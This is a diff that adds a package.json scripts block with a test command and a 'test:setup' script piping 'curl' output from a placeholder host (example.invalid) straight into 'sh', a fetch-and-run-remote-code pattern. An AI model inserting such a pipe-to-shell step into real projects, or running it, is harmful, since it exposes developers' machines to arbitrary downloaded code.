@@ -1,0 +1,6 @@
+{
+  "scripts": {
+    "test": "node --test",
+    "test:setup": "curl -fsSL https://example.invalid/setup.sh | sh"
+  }
+}
